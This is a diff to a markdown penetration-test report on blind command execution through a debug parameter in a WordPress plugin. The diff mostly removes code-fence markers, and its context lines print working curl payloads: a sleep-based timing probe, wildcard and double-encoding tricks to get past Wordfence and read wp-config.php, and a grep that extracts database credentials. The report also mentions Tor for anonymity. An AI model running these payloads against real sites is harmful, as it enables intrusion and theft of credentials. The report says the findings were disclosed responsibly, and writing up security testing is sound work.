@@ -36,7 +36,7 @@
 ### 1. 🔴 BLIND RCE (Direct Command Execution)
 **Source**: Vulnerable debug parameter in custom "Site Admin Helper" plugin (v1.2)
 
-```bash
+
 # 🕒 Timing-based command confirmation
 time curl "https://target.org/?debug=sleep%205"
 # ✅ Result: 5.2s delay confirming command execution
@@ -74,7 +74,7 @@ Wordfence Premium	Command execution detection evasion	100%
 Custom Security Rules	Author enumeration circumvention	100%
 Network Protections	Outbound filtering identification	Partial
 🔧 Technical Bypass Details:
-bash
+
 # ✅ Successful wildcard bypass
 curl "https://target.org/?debug=cat%20/var/www/html/wp-c*.php"
 
@@ -82,7 +82,7 @@ curl "https://target.org/?debug=cat%20/var/www/html/wp-c*.php"
 curl "https://target.org/?debug=cat%20/var/www/html/wp-config%252ephp"
 ⚡ ATTACK METHODOLOGY
 Phase 1: Reconnaissance & Enumeration
-bash
+
 # 🌐 WordPress version discovery
 curl "https://target.org/readme.html"
 curl "https://target.org/wp-content/plugins/wordfence/readme.txt"
@@ -96,7 +96,7 @@ curl "https://target.org/wp-content/plugins/elementor/readme.txt"
 Tools Used: Manual curl commands, Tor for anonymity, custom bash scripting
 
 Phase 2: WAF Bypass Development
-bash
+
 # 🎯 Wildcard techniques for file access
 curl "https://target.org/?debug=cat%20/var/www/html/wp-c*.php"
 curl "https://target.org/?debug=ls%20-la%20/var/www/html/%20|%20grep%20config"
@@ -114,8 +114,9 @@ Database Credentials Exposure	🔴 Critical	MySQL credentials extracted via wp-c
 File System Control	🔴 Critical	Arbitrary file read/write capabilities confirmed
 Server Information Disclosure	🟠 High	OS details, service configs, user context
 Web Directory Write Access	🟠 High	Uploads directory write permission verified
+
 Proof of Concept:
-bash
+
 # 💾 Database credential extraction
 curl "https://target.org/?debug=grep%20-E%20'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST'%20/var/www/html/wp-c*.php"
 
@@ -218,7 +219,7 @@ For Penetration Testers:
 
 ⚠️ RESPONSIBLE DISCLOSURE
 Ethical Standards Maintained:
-✅ All vulnerabilities reported to organization immediately
+✅ All vulnerabilities reported to the organization immediately
 
 ✅ No sensitive data exfiltrated or retained
 
